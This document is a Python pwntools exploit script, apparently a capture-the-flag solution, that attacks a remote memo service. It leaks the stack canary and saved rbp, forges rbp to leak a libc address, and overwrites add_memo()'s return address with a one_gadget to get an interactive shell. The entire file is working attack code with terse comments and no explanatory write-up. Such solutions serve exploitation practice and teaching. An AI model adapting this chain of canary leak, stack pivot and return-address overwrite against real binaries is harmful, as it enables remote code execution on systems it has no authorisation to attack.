from pwn import *

r = remote("ctf.adl.tw", 11007)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"


# set stack to null to satisfy one_gadget's constraint 
r.sendlineafter(":", "3")

# leak canary
r.sendlineafter(":", "1")
r.sendafter("\n", "a" * 0x28 + "x")
r.recvuntil("x")
canary = u64("\x00" + r.recv(7))
# leak rbp
r.sendlineafter(": ", "2")
r.sendafter("\n", "a" * 0x2f + "x")
r.recvuntil("x")
rbp = u64(r.recv(6).ljust(8, "\x00"))
fake_rbp = rbp + 0x48
# less significant byte of rbp must <= 0xb0
print("rbp = " + hex(rbp))

# fake rbp to leak libc
r.sendlineafter(": ", "2")
r.sendafter("\n", "a" * 0x28 + p64(canary) + p64(fake_rbp)[0])
r.sendlineafter(" : ", "3")
r.sendlineafter(":", "2")
r.recvuntil(": ")
libc = u64(r.recv(6).ljust(8, "\x00")) - 0x20830
one_gadget_off = 0x4526a
one_gadget = libc + one_gadget_off

# fake rbp to overwrite return address of add_memo()
fake_rbp = rbp - 0x18 
r.sendlineafter(":", "1")
r.sendafter("\n", "a" * 0x28 + p64(canary) + p64(fake_rbp)[0])
r.sendlineafter(" : ", "3")
r.sendlineafter(":", "1")
r.sendafter("\n", p64(one_gadget))
r.sendlineafter(" : ", "1")

r.interactive()

